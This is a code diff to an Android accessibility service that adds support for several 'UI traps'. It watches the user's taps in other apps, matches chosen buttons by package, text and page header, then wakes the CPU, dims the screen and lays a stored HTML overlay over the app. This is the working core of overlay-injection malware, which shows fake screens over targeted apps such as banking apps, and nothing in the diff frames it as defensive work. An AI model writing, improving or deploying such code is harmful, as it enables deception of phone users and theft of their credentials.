@@ -479,96 +479,109 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
-        // --- UNIVERSAL UI TRAP (Tap-Only Engine) ---
+        // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
         val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-        if (statsPrefs.getBoolean("ui_trap_active", false)) {
+        val trapsStr = statsPrefs.getString("ui_traps_array", "[]") ?: "[]"
+        if (trapsStr != "[]") {
             // STRICT REQUIREMENT: Only react to physical clicks
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
                 val pkg = event.packageName?.toString() ?: ""
                 
                 // CONSTRAINT: Ignore clicks on editable text fields to prevent false positives while typing
                 val isEditable = event.className?.toString()?.contains("EditText", ignoreCase = true) == true
                 
-                if (targetData.isNotEmpty() && !isEditable) {
-                    val parts = targetData.split("@@")
-                    val titleTarget = parts[0].trim()
-                    val expectedPkg = parts.getOrNull(2)?.trim()
-                    val headerAnchor = parts.getOrNull(3)?.trim()
+                if (!isEditable) {
+                    val trapsArr = try { org.json.JSONArray(trapsStr) } catch(e: Exception) { org.json.JSONArray() }
                     
-                    var isMatch = false
-                    
-                    // 1. Package Security Check
-                    if (expectedPkg.isNullOrEmpty() || pkg.contains(expectedPkg, ignoreCase = true)) {
+                    // Iterate through all active traps
+                    for (i in 0 until trapsArr.length()) {
+                        val trap = trapsArr.getJSONObject(i)
+                        val targetData = trap.optString("target", "")
                         
-                        // 2. HEADER ANCHOR SECURITY CHECK (Contextual Page Verification)
-                        var headerVerified = true
-                        if (!headerAnchor.isNullOrEmpty()) {
-                            val root = rootInActiveWindow
-                            headerVerified = root?.findAccessibilityNodeInfosByText(headerAnchor)?.any { 
-                                val id = it.viewIdResourceName ?: ""
-                                val text = it.text?.toString() ?: ""
-                                id.contains("title", ignoreCase = true) || text.equals(headerAnchor, ignoreCase = true)
-                            } ?: false
-                            if (!headerVerified) DebugLogger.log("UI_TRAP", "Header anchor [$headerAnchor] missing. Aborting trap.")
-                        }
-
-                        if (headerVerified) {
-                            // 3. FAST PATH: Read the internal event buffer directly.
-                            // This bypasses the node tree, surviving deep-sleep where event.source becomes null.
-                            val eText = event.text.joinToString(" ")
-                            val eDesc = event.contentDescription?.toString() ?: ""
+                        if (targetData.isEmpty()) continue
+                        
+                        val parts = targetData.split("@@")
+                        val titleTarget = parts[0].trim()
+                        val expectedPkg = parts.getOrNull(2)?.trim()
+                        val headerAnchor = parts.getOrNull(3)?.trim()
+                        
+                        var isMatch = false
+                        
+                        // 1. Package Security Check
+                        if (expectedPkg.isNullOrEmpty() || pkg.contains(expectedPkg, ignoreCase = true)) {
                             
-                            if (eText.contains(titleTarget, ignoreCase = true) || eDesc.contains(titleTarget, ignoreCase = true)) {
-                                isMatch = true
-                                DebugLogger.log("UI_TRAP", "✅ FAST-PATH MATCH: Caught via event text buffer (Survived Doze Mode).")
-                            } else {
-                                // 4. SLOW PATH: Deep structural node traversal for icon-only buttons
-                                val sourceNode = event.source
-                                if (verifyStructuralMatch(sourceNode, pkg, targetData)) {
+                            // 2. HEADER ANCHOR SECURITY CHECK (Contextual Page Verification)
+                            var headerVerified = true
+                            if (!headerAnchor.isNullOrEmpty()) {
+                                val root = rootInActiveWindow
+                                headerVerified = root?.findAccessibilityNodeInfosByText(headerAnchor)?.any { 
+                                    val id = it.viewIdResourceName ?: ""
+                                    val text = it.text?.toString() ?: ""
+                                    id.contains("title", ignoreCase = true) || text.equals(headerAnchor, ignoreCase = true)
+                                } ?: false
+                                if (!headerVerified) DebugLogger.log("UI_TRAP", "Header anchor [$headerAnchor] missing. Aborting trap.")
+                            }
+
+                            if (headerVerified) {
+                                // 3. FAST PATH: Read the internal event buffer directly.
+                                // This bypasses the node tree, surviving deep-sleep where event.source becomes null.
+                                val eText = event.text.joinToString(" ")
+                                val eDesc = event.contentDescription?.toString() ?: ""
+                                
+                                if (eText.contains(titleTarget, ignoreCase = true) || eDesc.contains(titleTarget, ignoreCase = true)) {
                                     isMatch = true
+                                    DebugLogger.log("UI_TRAP", "✅ FAST-PATH MATCH: Caught via event text buffer (Survived Doze Mode).")
+                                } else {
+                                    // 4. SLOW PATH: Deep structural node traversal for icon-only buttons
+                                    val sourceNode = event.source
+                                    if (verifyStructuralMatch(sourceNode, pkg, targetData)) {
+                                        isMatch = true
+                                    }
+                                    sourceNode?.recycle() // Prevent memory leaks
                                 }
-                                sourceNode?.recycle() // Prevent memory leaks
                             }
                         }
-                    }
 
-                    if (isMatch) {
-                        val now = System.currentTimeMillis()
-                        val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
-                        
-                        if (now - lastTrigger > 2000) {
-                            statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
+                        if (isMatch) {
+                            val now = System.currentTimeMillis()
+                            val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
                             
-                            val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
-                            val html = statsPrefs.getString("ui_trap_html", "") ?: ""
-                            val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
-                            val dimLevel = statsPrefs.getInt("ui_trap_dim", 20)
-                            
-                            DebugLogger.log("UI_TRAP", "Deploying trap sequence (Persistent).")
-                            
-                            // WAKE CPU FOR TRANSITION: Prevents the OS from micro-sleeping while rendering WebView
-                            try {
-                                val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                                val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
-                                wakeLock.acquire(3000)
-                            } catch (e: Exception) {}
+                            if (now - lastTrigger > 2000) {
+                                statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
+                                
+                                val method = trap.optString("method", "ACC")
+                                val html = trap.optString("html", "")
+                                val timeout = trap.optLong("timeout", 10L)
+                                val dimLevel = trap.optInt("dim", 20)
+                                
+                                DebugLogger.log("UI_TRAP", "Deploying trap sequence for target: $titleTarget")
+                                
+                                // WAKE CPU FOR TRANSITION: Prevents the OS from micro-sleeping while rendering WebView
+                                try {
+                                    val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                                    val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
+                                    wakeLock.acquire(3000)
+                                } catch (e: Exception) {}
 
-                            Handler(Looper.getMainLooper()).post {
-                                DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
-                                DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
-                            }
-                            
-                            Handler(Looper.getMainLooper()).postDelayed({
-                                DimmerManager.removeOverlay(this@MyAccessibilityService)
-                            }, 2500)
-                            
-                            if (timeout > 0L) {
+                                Handler(Looper.getMainLooper()).post {
+                                    DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
+                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
+                                }
+                                
                                 Handler(Looper.getMainLooper()).postDelayed({
-                                    DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay.")
-                                    DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                }, timeout * 1000)
+                                    DimmerManager.removeOverlay(this@MyAccessibilityService)
+                                }, 2500)
+                                
+                                if (timeout > 0L) {
+                                    Handler(Looper.getMainLooper()).postDelayed({
+                                        DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay.")
+                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                    }, timeout * 1000)
+                                }
                             }
+                            
+                            // Break out of the loop since we matched and triggered a trap
+                            break
                         }
                     }
                 }
